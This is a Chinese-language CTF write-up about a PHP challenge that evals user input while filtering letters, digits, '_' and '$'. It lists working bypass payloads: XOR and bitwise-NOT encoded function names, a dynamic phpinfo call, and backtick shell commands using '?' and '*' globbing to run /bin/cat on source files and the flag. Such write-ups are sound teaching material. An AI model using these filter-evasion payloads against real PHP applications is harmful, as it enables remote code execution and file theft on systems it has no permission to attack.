---
title: CTF一道web题小结-无数字字母getFlag()
date: 2018-10-11 10:42:01
tags:
  - web
  - flag
categories: CTF
---

## 0x01 前言
最近遇到个CTF题目，分析后涨了波知识，题目如下：
```php
<?php
include 'flag.php';
if(isset($_GET['code'])){
    $code = $_GET['code'];
    if(strlen($code)>35){
        die("Long.");
    }
    if(preg_match("/[A-Za-z0-9_$]+/",$code)){
        die("NO.");
    }
    @eval($code);
}else{
    highlight_file(__FILE__);
}
//$hint =  "php function getFlag() to get flag";
?>
```
分析代码，了解到我们需要满足两个条件：
1. 长度不能大于35
2. 不能存在数字字母_和$符号

## 0x02 无数字字母构造payload
首先，看到不能存在字母数字就想到了phithon师傅的文章里关于无字母数字webshell提到的3种方法提供了两种思路：
1. 利用位运算
2. 利用自增运算符
想到payload应该是code=getFlag(),于是开始构造getFlag()。
在网上找到一个payload如下：
```
$_="{{{{{{{"^"%1c%1e%0f%3d%17%1a%1c";$_();
```
分析：
```
采用异或运算
{ ^ %1c = g
{ ^ %1e = e
{ ^ %0f = t
{ ^ %3d = F
{ ^ %17 = l
{ ^ %1a = a
所以"{{{{{{{"^"%1c%1e%0f%3d%17%1a%1c" = getFlag
$_=getFlag将_赋值为getFlag，最终得到getFlag()。
```
还有个payload为
```
?code=$_=~%98%9A%8B%B9%93%9E%98;$_();
```
直接取反getFlag再url编码。
其中_可以使用汉字代替，如
```
$啊=~%98%9A%8B%B9%93%9E%98;$啊();
```
当不过滤<strong>$</strong>符号时,可以这样操作，但是<strong>$</strong>符号过滤了，参考p牛的《无字母数字webshell之提高篇》中讲到PHP7前是允许使用($a)()来执行动态函数;
此时，测试使用phpinfo();payload如下：
```
(~%8F%97%8F%96%91%99%90)();
```
使用php5进行测试时如下：
![](2018-10-11-CTF一道web题小结-无数字字母getFlag\php5测试phpinfo.PNG)

获取phpinfo信息失败。

使用php7进行测试时如下：
![](2018-10-11-CTF一道web题小结-无数字字母getFlag\php7测试phpinfo.PNG)

获取phpinfo信息成功。

## 0x03 解题思路
利用通配符调用Linux系统命令 来查看flag。
在Linux系统中可以使用? * 等字符来正则匹配字母：

    *可以代替0个及以上任意字符
    ?可以代表1个任意字符
```
/???/??? => /bin/cat
```
用此来读取源码
```
$_=`/???/???%20/???/???/????/?????.???`;?><?=$_?>
"/bin/cat /var/www/html/index.php"
```
为保持长度小于35且不存在$_,则将$_带入后面一个表达式，同时使用*来匹配最后文件
```
?><?=`/???/???%20/???/???/????/*`?>
```
php使用短链接，其含义如下
```
<?php echo `/bin/cat /var/www/html/index.php`?>
```
读取到源码发现存在如下函数：
```
function getFlag(){
	$flag = file_get_contents('/flag');
	echo $flag;
}
```
最后直接读取flag文件。
```
?><?=`/???/???%20/????`;?>
```

## 0x04 其它思考
windows中将if(preg_match("/[A-Za-z0-9_$]+/",$code))过滤修改，去除对大写字母或小写的过滤，由于windows对大小写不敏感，可以在windows系统中尝试执行任意代码
![](2018-10-11-CTF一道web题小结-无数字字母getFlag\windows执行任意代码.PNG)

不对if(preg_match("/[A-Za-z0-9_$]+/",$code))进行修改，将whoami进行取反再url编码：
```
~%88%97%90%9E%92%96
```
则失败。
![](2018-10-11-CTF一道web题小结-无数字字母getFlag\windows绕过失败.PNG)

去除[A-Za-z0-9_$]同样也无法执行代码，可见在windows中对命令进行位运算后会执行失败。

## 0x05 参考
[[红日安全]PHP-Audit-Labs题解之Day5-8](https://xz.aliyun.com/t/2597#toc-8)
[一些不包含数字和字母的webshell](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html)
[无字母数字webshell之提高篇](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html)
[CTF题目思考--极限利用](https://www.anquanke.com/post/id/154284)
